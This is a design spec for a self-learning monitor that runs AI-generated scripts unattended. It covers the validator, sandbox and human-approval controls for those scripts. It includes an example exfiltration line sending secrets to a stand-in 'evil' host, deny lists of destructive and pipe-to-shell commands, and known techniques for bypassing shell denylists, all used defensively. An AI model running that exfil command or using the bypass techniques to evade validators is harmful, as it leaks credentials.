# Self-Learning `script_cache` Monitor Runner

Status: **spec, pending human approval.** Issue: #327 · Builds on PR #294
(`tool_poll`/`venn_poll` + script-cache foundation) · Linear MDS-52 (epic),
MDS-53.

> This document is the design spec for #327 and is a **superset** of the issue.
> It is committed to the same branch as the implementation (unified spec+impl
> PR) but **no implementation lands until a human approves the security model
> in §3 and the open decision in §3.4.**

---

## 1. Problem

`tool_poll`/`venn_poll` (#294) made idle polls cost ~$0, but the monitor author
must hand-write the exact CLI invocation (`venn tools execute -s work-gmail -t
list_messages -a '{...}'`). Supporting a new service means knowing its exact
tool syntax up front.

We want a monitor whose only config is a **natural-language prompt**:

```yaml
- name: unread-emails
  check: script_cache
  prompt: "Check my email for unread messages"
  id_field: id
  interval: 5m
  event: monitor/email.received
```

…that is **self-learning** (figures out the tool calls itself on first run) and
**self-healing** (regenerates its own script when an API/auth change breaks it),
while still costing ~$0 on the steady-state path.

## 2. How it differs from #294 (and why that matters)

#294's `_run_command()` caches a **command the human already wrote** — the
cached `.sh` is just a quoted re-spelling of `monitor.extra['command']`. The
trust boundary is unchanged: a human authored the command.

`script_cache` caches a **script an LLM agent wrote**. A cron now executes
machine-generated code, unattended, with the manager's environment (which holds
`VENN_API_KEY`, `GH_TOKEN`, `SLACK_BOT_TOKEN`, …). **That is the entire reason
this is a spec and not a patch.** The security model in §3 is the load-bearing
part of this design; everything else is mechanism.

Two distinct trust surfaces, kept separate throughout this spec:

| Surface | Trust today | This spec |
|---|---|---|
| **Generation step** — the agent runtime discovers tools, runs the check, emits a script | Same as #294 description-only checks (a supervised agent already runs read-only with `CHECK_MAX_TURNS`) — **status quo, no new risk** | Reused as-is, with a specialized prompt |
| **Persisted script** — runs unattended on every subsequent tick via `subprocess` | **New** — did not exist for agent-authored scripts | Validator + sandbox + approval gate (§3) |

## 3. Security model (the core of this spec)

Defense in depth across four layers. A script must clear **all** of them before
it ever runs unattended.

### 3.1 Generation constraints (prompt-level)

The generation prompt (a specialized variant of `_build_check_prompt`) instructs
the agent to emit a script that is **read-only and side-effect free**, using only
an allowlisted set of binaries, writing **only** to stdout, and taking **no**
arguments. The agent is told the script will be statically rejected if it writes
files, mutates remote state, or shells out to anything off the allowlist — so it
self-corrects before we even validate. Prompt constraints are a usability aid,
**not** a control; the validator below is the control.

### 3.2 Static validation gate (the control)

Before a generated (or regenerated) script is pinned, `_validate_script()` runs
and must pass. The script is rejected (never pinned, never run unattended) on any
violation:

- **Interpreter allowlist** — shebang must be `#!/usr/bin/env bash` (with
  `set -euo pipefail`) or `#!/usr/bin/env python3`. Nothing else.
- **Binary allowlist** — every external command invoked must be in
  `SCRIPT_BINARY_ALLOWLIST` (default: `venn`, `gh`, `jq`, `python3`, `cat`,
  `echo`, `printf`, `head`, `tail`, `sort`, `uniq`, `grep`, `cut`, `tr`, `date`,
  `sed` read-only usage). The list is policy-configurable.
  **Raw `curl`/`wget` are NOT on the default allowlist** — see the exfiltration
  note below. `venn` and `gh` reach known service hosts with their own auth; raw
  HTTP to an arbitrary host is the easiest exfil channel, so it requires explicit
  per-install opt-in (`script_cache.allow_http: true`).
- **Side-effect deny scan** — reject on any of: output redirection (`>`, `>>`,
  `tee`, `dd`, `truncate`), filesystem mutation (`rm`, `mv`, `cp`, `mkdir`,
  `chmod`, `chown`, `ln`, `install`), privilege/exec escalation (`sudo`, `su`,
  `eval`, `exec`, `source`, backtick-or-`$()`-piped-to-shell,
  `base64 … | bash`/`sh`, `python -c` writing files), package managers
  (`pip`, `npm`, `apt`, `brew`, `uv`, `cargo`), VCS mutation (`git push`,
  `git commit`, `git config`).
- **Network is read-shaped only** — when `curl` is opt-in enabled, it may not
  carry `-X POST|PUT|DELETE|PATCH`, `-d/--data*`, `-T/--upload-file`, or
  `-F/--form` (plain GETs only), **and** its URL must be a literal on a host
  allowlist — no command substitution or variable in the URL (that's the
  `curl https://evil/?x=$(cat secret)` exfil vector). A GET is "read-only" to the
  *target* but is a perfect *outbound* channel; this is why raw HTTP is off by
  default and host-pinned when on.
- **Venn is read-only** — `venn tools execute` is allowed; **`--confirm` is
  forbidden** (Venn's own contract is that `--confirm` gates *write* operations).
  This single rule blocks "charge a card / send an email / delete a record" by
  construction.

The validator is a **denylist-backstopped allowlist**: unknown binary → reject;
known binary used in a write-shaped way → reject. It runs on bash via a tokenized
parse (`shlex` + `bashlex` if available, falling back to conservative line/token
matching) and on python3 via `ast` (reject `open(...,'w'|'a'|'x')`, `os.remove`,
`subprocess` with write-shaped args, `shutil` mutators, `socket` servers).

**Honesty about the limit (do not oversell this):** bash is Turing-complete, so a
static token/AST scan of *arbitrary* shell is **best-effort, not a hard control** —
string concatenation, `${var}` indirection, command substitution that assembles a
binary name, `$'\x..'` byte escapes, here-strings, and process substitution
`<(...)` can all defeat a denylist. We therefore do **two** things rather than
trust the scanner:

1. **Constrain the generated grammar.** The generator is asked to emit a script
   in a **restricted form**: no `eval`/`exec`/`source`, no command substitution in
   command *position*, no functions, no backgrounding, no process substitution —
   ideally a flat sequence of simple commands. The validator **rejects** any
   script using those constructs (rejecting the construct is tractable even when
   reasoning about its *effect* is not). A script the validator can't parse into
   simple commands is rejected, not waved through.
2. **Treat the §3.3 sandbox as the real boundary** (next section). The validator
   shrinks the attack surface; the sandbox is what actually contains a miss.

> **Strongly considered, recommended for impl review:** have the agent emit a
> **structured command plan** (JSON: `[{binary, args[]}, …]`) that *we* render and
> execute, instead of free-form bash. Validation of a fixed-shape plan is exact,
> not heuristic. The cost is less flexibility (no piping/jq inside the script —
> parsing moves to `_parse_items`). Flagged as the cleanest way to make §3.2 a
> hard control; final call at impl time with the reviewer.

### 3.3 Runtime sandbox (belt and suspenders)

Even a validated script runs constrained, so a validator miss can't do damage:

- **Timeout** — `TOOL_TIMEOUT` (60s), wall-clock killed (reuse #294).
- **Writes confined, not banned.** `RLIMIT_FSIZE=0` was tempting but **wrong**:
  `gh`/`venn`/`jq` legitimately write cache/cookie/config files under `$HOME`/
  `$TMPDIR`, so a zero file-size limit makes every real script fail → permanent
  self-heal storms. Instead, **redirect writable roots to disposable scratch**:
  run in a fresh `tempfile.mkdtemp()` as CWD with `HOME`, `XDG_*`, and `TMPDIR`
  all pointed *into* that scratch dir, and a **bounded** `RLIMIT_FSIZE` (e.g.
  10 MB). Tools that need a cache work; nothing can touch the repo, `.modastack/`,
  or the real `$HOME`, and the whole scratch tree is deleted after the run.
- **`RLIMIT_AS`, `RLIMIT_CPU`, `RLIMIT_NPROC`, `RLIMIT_CORE=0`** via `preexec_fn`
  — bound memory, CPU, fork-bombs, core dumps.
- **Re-verify before every unattended run (TOCTOU).** Validation happens at *pin*
  time but the script runs much later, so the runner re-checks integrity before
  each subprocess: the `sha256` recorded in trusted state (`monitor_state.json`,
  §6) must match the on-disk file, and `_validate_script()` is re-run (it's
  cheap). A tampered or hash-mismatched script is refused and treated as a failed
  active script (→ self-heal), never executed.
- **Env** — the script inherits the service API keys it needs (secrets are never
  written into the script body, only referenced via `$VAR`). This is the weakest
  point: a validated read-only script still *runs with the full secret env* and
  can read it. Per-script env scoping (§8) is the top future hardening; until
  then, the residual is documented in §3.6.

### 3.4 First-run approval — **OPEN DECISION, needs human sign-off**

Whether an agent-generated script may run unattended *the first time* without a
human looking at it. Three modes, selected by a `script_cache.approval` policy:

- **`review` (recommended default)** — a newly generated/regenerated script is
  written to `.modastack/state/scripts/pending/<name>.sh`, **not** activated. A
  `monitor/script.review_requested` event fires (the human sees the diff and the
  validator report). Until a human promotes it (`modastack monitors approve-script
  <name>`), the monitor keeps using the **agent runtime** each tick — correct
  results, just not yet $0. Once approved, it's pinned and the fast path engages.
- **`auto`** — a script that passes the §3.2 validator + §3.5 smoke run is pinned
  and run unattended with no human in the loop. Fastest to $0; trusts the
  validator fully.
- **`off`** — never persist scripts; always use the agent runtime (this monitor
  behaves like a #294 description-only check). Escape hatch for high-sensitivity
  installs.

**Re-approval on self-heal:** once a human has approved a script, a self-heal
regeneration auto-promotes **only if it stays inside the recorded capability
envelope** — same binary set, same Venn `service`+`tool` pairs, **and** same set
of network hosts (a regen that keeps `curl` but swaps the URL host is a *new*
capability, not a mechanical repair, and re-enters `review`). Anything outside the
envelope — new binary, new Venn tool, new host — re-enters `review`. This keeps
self-healing zero-touch for genuine mechanical repairs (auth rotation, query
tweak) while any capability change gets fresh human eyes. The envelope is stored
in trusted state alongside the content hash (§6), not only in the script header.

> **Question for the reviewer:** confirm `review` as the shipped default (safe,
> one-time human click per monitor), or choose `auto` (frictionless, validator-
> trusted). This is the one decision that should not be made without you.

### 3.6 Residual risk (stated plainly)

What this design does **not** fully contain in v1 — so the reviewer judges with
eyes open:

1. **Secret-bearing exfiltration.** A validated read-only script runs with the
   full secret env and can read it. With raw HTTP off by default, exfil requires
   `venn`/`gh` (which egress only to their own known hosts) — meaningfully harder,
   not impossible. Real fix = per-script env scoping + egress allowlist (§8).
2. **Static bash validation is heuristic, not a proof** (§3.2). The sandbox
   (§3.3) — not the scanner — is the boundary that actually contains a bypass; the
   structured-command-plan option is the path to making validation exact.
3. **The generation step is a full-powered agent.** During generation the agent
   has the same tool access as today's description-only checks and could take a
   side-effect *while generating* (not just in the cached script). This is
   pre-existing status quo (#294), not introduced here, but it is the reason
   `review`/`auto` only govern the *persisted* script, not the generation step.
4. **No container isolation in v1** (no seccomp/bubblewrap/netns). `RLIMIT_*` +
   redirected-HOME scratch is the boundary; OS-level isolation is §8.

These are acceptable for the stated use cases (read-my-email, watch-a-PR) under
`review` default + raw-HTTP-off; they would **not** be acceptable for a
money-movement monitor, which §8 puts explicitly out of scope.

## 4. Cache invalidation policy

A pinned script is regenerated when, and only when:

1. **No active script exists** — first run (always agent runtime).
2. **The active script fails** — non-zero exit, timeout, or unparseable output
   on a tick → one self-heal attempt this tick (budget in §5).
3. **The prompt/config fingerprint changed** — the active script header embeds
   `sha256(prompt + id_field + relevant extra)`. On mismatch (the human edited
   the monitor), the script is treated as stale and regenerated. This is how
   "monitor config changes invalidate the cache."
4. **Explicit invalidation** — `modastack monitors recache <name>` deletes the
   active script; next tick regenerates.

Optional `max_age` (default **unset** — determinism over freshness): when set, a
script older than `max_age` is refreshed on its next tick.

## 5. Retry / budget model

Per tick, the runner walks:

```
active script exists & fingerprint matches?
  ├─ yes → run sandboxed ($0)
  │         ├─ ok + parseable  → return conditions                  [mode=cached]
  │         └─ fail/garbage    → fall through to self-heal ↓
  └─ no  → self-heal ↓

self-heal (bounded):
  agent runtime (CHECK_MAX_TURNS=8): discover + execute + emit candidate script
    ├─ candidate passes §3.2 validate + §3.5 smoke → pin (or queue, per §3.4)
    │      return this tick's conditions from the agent run    [mode=fallback/first_gen]
    └─ candidate fails → do NOT pin; return the agent run's conditions anyway
           increment consecutive-regen counter
```

Key properties:

- **A self-heal tick is never wasted** — the agent both *produces this tick's
  result* and *emits a script*, so detection never stalls while healing.
- **Per-tick agent budget** — exactly one agent invocation per tick, capped at
  `CHECK_MAX_TURNS = 8` (reused from #294). No unbounded fix loops within a tick.
- **Cross-tick circuit breaker** — a `script_regen_fails` counter in monitor
  state. After `SCRIPT_REGEN_MAX = 3` consecutive ticks whose freshly generated
  script *also* fails validate/smoke, stop trying to pin and fire
  `monitor/script.failing` (alert a human). **Do not hammer the agent every tick**
  — that would re-introduce the exact per-tick Opus cost #294 eliminated. Instead
  the degraded path runs the agent on an **exponential backoff** (e.g. effective
  interval ×2 each failed regen, capped at ~6h) so detection continues at reduced
  frequency and bounded cost until a human intervenes. The counter and backoff
  reset to 0 on any successful cached-script run or successful pin. A
  `script_cache.on_persistent_failure: pause` policy lets high-sensitivity
  installs choose "pause + alert" over "degrade + backoff."

## 6. Determinism (pin once, freeze)

The agent may emit a different script each run, so we pin:

- A candidate becomes the **active** script only after passing §3.2 validation
  **and** a §3.5 smoke run, then via **atomic rename** (`os.replace`) into
  `.modastack/state/scripts/<name>.sh`. A partial/garbage script never becomes
  active.
- Once active, the script is **immutable and the agent is never called again**
  until an invalidation condition (§4) fires. Steady state is pure `subprocess`.
- The active script's header records provenance for humans: prompt fingerprint,
  generator model, generation timestamp, content `sha256`, and the validated
  capability envelope. **The trusted copy of the `sha256` + envelope lives in
  `monitor_state.json`, not only in the script header** — the header is inside the
  file we execute and is therefore mutable; the pre-run integrity check (§3.3
  TOCTOU) and the §3.4 re-approval envelope check both read from trusted state.

### 6.1 Smoke run (gating a pin)

Before pinning, the candidate is executed once in the §3.3 sandbox and its stdout
parsed with the existing `_parse_items()`. It is pinned only if parsing yields a
list (conditions **or** a clean empty list). This rejects a script that "exits 0"
but prints garbage — closing the gap the #294 mutate test documents.

## 7. Observability (cached-vs-fallback + cost delta)

Per tick, a structured record is emitted (log line + appended to monitor state):

- `mode` ∈ `cached` | `first_gen` | `fallback_regen` | `quarantined_agent`
- `cost_usd` — `0.0` for `cached`; `CheckResult.total_cost_usd` for agent runs
- `duration_ms`, `returncode`, `conditions_count`

Rolling per-monitor counters in `monitor_state.json`: `cached_runs`,
`fallback_runs`, `total_agent_cost_usd`, `last_mode`, `last_regen_at`,
`script_regen_fails`. Surfaced by:

- `modastack monitors list` — shows `mode` + cumulative savings per monitor.
- `modastack costs --by role` — agent-runtime spend already attributes to
  `role=monitor` (no change needed); cached ticks add nothing, which *is* the
  win made visible.
- One log line per tick: `script_cache <name>: mode=cached cost=$0 (saved ~$X
  vs agent baseline)`.

## 8. Architecture & scope

**In scope**

- New framework runner `modastack/monitors/script_cache_checks.py` exporting
  `CHECKS = {"script_cache": script_cache}` — auto-loaded by the existing
  `_load_framework_checks()` `*_checks.py` glob (no scheduler change to register).
- Reuse `_parse_items()` / `_items_to_conditions()` from `tool_checks.py`
  (extract the shared helpers to a small `_poll_common.py`, or import directly —
  decided at impl time; no behavior change to `tool_poll`).
- The specialized generation prompt + `run_check_blocking`-style agent call that
  returns both this tick's items and a written candidate script.
- `_validate_script()`, the §3.3 sandbox runner, the pin/atomic-rename + approval
  queue, the circuit breaker, and the observability counters.
- CLI: `modastack monitors recache <name>`, `modastack monitors approve-script
  <name>` (+ `list` showing mode/savings).
- `prompt` and `id_field` ride in `Monitor.extra` — **no schema change** (they're
  already non-reserved keys; verified in `monitors/schema.py`).

**Out of scope (v1)**

- Per-script env scoping (run each script with only the secrets it needs) — needs
  capability inference; noted as the top future hardening item.
- Container/namespace isolation (seccomp, bubblewrap) — `RLIMIT_FSIZE=0` + scratch
  CWD is the v1 boundary; document the residual (a validated read-only script can
  still *read* env/files it has rights to and make GET requests).
- Cross-monitor script sharing / a global script library.
- `script_cache` for any **money-movement** monitor — explicitly unsupported; the
  §3.2 no-`--confirm` / no-write rules block it by construction, and docs will say
  so (ties to the engineer Stripe scope guard).

## 9. Verification plan

Unit (no Claude CLI; mirror `test_tool_poll.py` style):

- **Validator** — accepts a clean read-only bash + python3 script; rejects each
  denied pattern (redirect, `rm`, `sudo`, `curl -X POST`, `curl -d`,
  `venn … --confirm`, off-allowlist binary incl. raw `curl` when not opted in,
  `curl` URL with command substitution / off-allowlist host, `eval`/`exec`/
  process-substitution constructs, bad shebang, `open(...,'w')`).
- **Sandbox** — bounded `RLIMIT_FSIZE` lets `jq`-style temp writes succeed but a
  large/repo write fails; `HOME`/`TMPDIR` redirected to scratch and cleaned up;
  timeout kills a sleeper; a write to the repo path is denied.
- **TOCTOU** — a script whose on-disk `sha256` no longer matches trusted state is
  refused and routed to self-heal, never executed.
- **Pin lifecycle** — candidate passes validate+smoke → atomic-rename to active;
  failed smoke → not pinned; fingerprint mismatch → regenerate; `recache` deletes.
- **Approval modes** — `review` queues to `pending/` + fires
  `script.review_requested` and keeps using agent runtime; `auto` pins directly;
  `off` never persists; self-heal inside the validated envelope auto-promotes,
  new-binary re-enters review.
- **Budget/breaker** — one agent call per tick; `SCRIPT_REGEN_MAX` consecutive
  failures fire `script.failing` and degrade to agent runtime; counter resets on
  success.
- **Observability** — counters increment; `mode`/`cost_usd` recorded per tick.

Integration (real subprocess + real I/O, no Claude CLI — extend
`tests/integration/test_script_cache.py`):

- First run pins a (fixture-injected) script; second run is `cached` at `$0`.
- Broken active script → self-heal path → re-pin (agent step stubbed to emit a
  known-good candidate).
- Full scheduler `_reconcile`: new IDs fire, same IDs dedup, disappeared drop,
  reappeared refire — identical semantics to `tool_poll`.

One real-agent integration test (gated like existing Claude-CLI tests) proving an
NL prompt generates → validates → pins an executable script end-to-end.

## 10. Implementation plan

1. Extract shared parse helpers; add `script_cache_checks.py` skeleton + CHECKS.
2. `_validate_script()` (bash + python3 AST) + its unit tests (TDD — tests first).
3. Sandbox runner (`RLIMIT_*`, scratch CWD, timeout) + tests.
4. Generation prompt + agent call returning (items, candidate script) + smoke run.
5. Pin/atomic-rename, fingerprint header, approval queue + modes (§3.4).
6. Circuit breaker + observability counters.
7. CLI: `recache`, `approve-script`, `list` columns.
8. Integration tests + docs; `/review` + adversarial `codex` pass on the security
   surface before marking ready.
